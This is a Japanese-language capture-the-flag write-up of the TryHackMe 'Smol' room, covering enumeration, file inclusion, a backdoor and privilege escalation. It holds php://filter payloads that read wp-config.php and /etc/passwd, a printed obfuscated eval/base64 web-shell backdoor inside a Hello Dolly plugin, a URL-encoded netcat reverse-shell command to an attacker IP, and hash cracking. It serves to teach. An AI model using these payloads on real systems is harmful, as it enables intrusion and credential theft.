# Smol CTF

https://tryhackme.com/room/smol

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.231.209
sudo bash -c "echo $TARGET   smol.thm >> /etc/hosts"

root@ip-10-10-20-40:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-16 05:45 BST
Nmap scan report for smol.thm (10.10.231.209)
Host is up (0.000082s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:05:FA:98:59:D9 (Unknown)

root@ip-10-10-20-40:~# sudo nmap -sS -A -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-16 05:45 BST
Nmap scan report for smol.thm (10.10.231.209)
Host is up (0.00016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm/
MAC Address: 02:05:FA:98:59:D9 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms smol.thm (10.10.231.209)
```

SSH, HTTP のみ。

### サブドメイン

```shell
ffuf -u http://smol.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.example.thm' -fs 0
```

www のみ。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://www.smol.thm -w ./dirlist.txt -t 30 -k

===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
/license.txt          (Status: 200) [Size: 19915]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/wp-login.php         (Status: 200) [Size: 4537]
/wp-config.php        (Status: 200) [Size: 0]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://www.smol.thm/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]
```

### wpscan

```shell
$ wpscan --url http://www.smol.thm -e
```

ユーザー

```
[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

`jsmol2wp 1.07` プラグインを検出

```
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

## jsmol2wp

v1.0.7 には、ファイルインクルージョンの脆弱性がある。

https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt

config.php

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

```php
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', '[REDACTED]' );
```

DB のパスワードは判明。

/etc/passwd

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../etc/passwd

```
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```

- それぞれのユーザーについて、.ssh/id_rsa を試したが出てこなかった。
- また、DB のパスワードで SSH ログインを試したが、パスワードによるログインが許可されていなかった。
- パスワードを wordpress のログイン画面で使ってもログインできなかった。

→ wpuser でログインできた。

```
[i] User(s) Identified:

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)
```

wpscan が検出したのは表示名で、wpuser がシステム的なユーザー名であることを見落としていた。

## wpuser ダッシュボード

未 Publish のポストに次の記述があった。

```
1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
```

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php

で PHP のコードを表示。

```php
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));

	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

base64 部分をデコード。GET cmd パラメータを system 関数で実行している。

```
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

下記により、/wp-admin/ 配下にアクセスすることがトリガーになる。

```python
add_action( 'admin_notices', 'hello_dolly' );
```

http://www.smol.thm/wp-admin/edit.php?cmd=rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff|sh%20-i%202%3E%261|nc%2010.13.85.243%206666%20%3E%2ftmp%2ff  
にアクセス。

リバースシェル取得成功。

```shell
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.231.209] 38162
sh: 0: can't access tty; job control turned off
$
```

## 権限昇格１

すぐにはユーザーディレクトリには入れない。

```shell
www-data@smol:/var/www/wordpress/wp-admin$ ls -al /home
total 24
drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
drwxr-x---  2 diego internal 4096 Aug 18  2023 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi

www-data@smol:/var/www/wordpress/wp-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@smol:/var/www/wordpress/wp-admin$ cat /etc/group | grep internal
```

前に入手した DB 認証情報で、MySQL に接続してユーザーテーブルを取得。

```shell
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcb......................... | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```

```shell
.\hashcat.exe -m 400 hash.txt rockyou.txt

$P$BWF............................:[REDACTED]
```

diego のパスワードだけクラックできた。su で昇格可能。

```shell
diego@smol:~$ cat user.txt
45ed.............................
```

ユーザーフラグゲット。

## 権限昇格２

diego で /home/think/.ssh/id_rsa を読めたので、think ユーザーとして SSH 接続できた。

## 権限昇格３，４

gege の下に root でバックアップが作られていることから、gege への昇格を目指す。

```shell
think@smol:/home/gege$ ls -al
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
```

MySQL のバックアップファイルを、`gege` で grep。

```shell
grep gege /opt/wp_backup.sql
```

gege のパスワードハッシュが前回と異なっていた。

```
(4,'gege','$P$BsIY.........................','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege')
```

このハッシュは、hashcat & rockyou.txt でクラックできた。

`su gege` の実行にパスワードが必要かと思っていたが、パスワードが無くても変更できた。

しかし、その後の zip ファイルの展開で、クラックしたパスワードを使えた。

wp-config.php

```
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', '[REDACTED]' );
```

## 権限昇格５

```shell
xavi@smol:/home/gege/wordpress.old$ sudo -l
[sudo] password for xavi:
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

ようやくゴール！

```shell
xavi@smol:/home/gege/wordpress.old$ sudo bash -p
root@smol:/home/gege/wordpress.old$ id
uid=0(root) gid=0(root) groups=0(root)
root@smol:/home/gege/wordpress.old$ ls /root
total 48K
drwx------  7 root root 4.0K Jan 28 13:46 .
drwxr-xr-x 18 root root 4.0K Mar 29  2024 ..
lrwxrwxrwx  1 root root    9 Jun  2  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.2K Jun 21  2023 .bashrc
drwx------  2 root root 4.0K Jun  2  2023 .cache
-rw-------  1 root root   35 Mar 29  2024 .lesshst
drwxr-xr-x  3 root root 4.0K Jun 21  2023 .local
lrwxrwxrwx  1 root root    9 Aug 18  2023 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4.0K Aug 16  2023 .phpbrew
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r-----  1 root root   33 Aug 16  2023 root.txt
-rw-r--r--  1 root root   75 Aug 17  2023 .selected_editor
drwx------  3 root root 4.0K Jun 21  2023 snap
drwx------  2 root root 4.0K Jun  2  2023 .ssh
-rw-rw-rw-  1 root root    0 Jan 28 13:46 .viminfo
root@smol:/home/gege/wordpress.old$ cat /root/root.txt
bf8.............................
```

## 振り返り

- ルーム名の関係で jsmol2wp にすぐ注目できたが、ノーヒントだったら難しかったかもしれない。
- wpscan で列挙される表示名は、システム的なユーザー名と一致するとは限らないことに注意が必要。
- 都合 5 回の権限昇格が必要だったが、どれから侵害すべきか順序が分からないので難しかった。
- 技術的な面では真新しいものはなかったが、HelloDolly が実行されるトリガーについては勉強になった。
